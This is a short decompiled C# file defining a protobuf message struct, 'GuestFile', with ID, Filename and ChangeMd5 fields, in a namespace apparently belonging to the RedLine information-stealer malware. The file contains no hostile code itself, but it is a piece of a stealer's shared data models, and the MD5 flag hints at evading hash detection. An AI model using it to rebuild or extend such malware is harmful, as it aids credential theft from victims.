using System.Runtime.CompilerServices;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "GuestFile")]
public struct GuestFile
{
	[CompilerGenerated]
	private int int_0;

	[CompilerGenerated]
	private string string_0;

	[CompilerGenerated]
	private bool bool_0;

	[ProtoMember(1, Name = "ID")]
	public int ID
	{
		[CompilerGenerated]
		get
		{
			return int_0;
		}
		[CompilerGenerated]
		set
		{
			int_0 = value;
		}
	}

	[ProtoMember(2, Name = "Filename")]
	public string Filename
	{
		[CompilerGenerated]
		get
		{
			return string_0;
		}
		[CompilerGenerated]
		set
		{
			string_0 = value;
		}
	}

	[ProtoMember(3, Name = "ChangeMd5")]
	public bool ChangeMd5
	{
		[CompilerGenerated]
		get
		{
			return bool_0;
		}
		[CompilerGenerated]
		set
		{
			bool_0 = value;
		}
	}
}
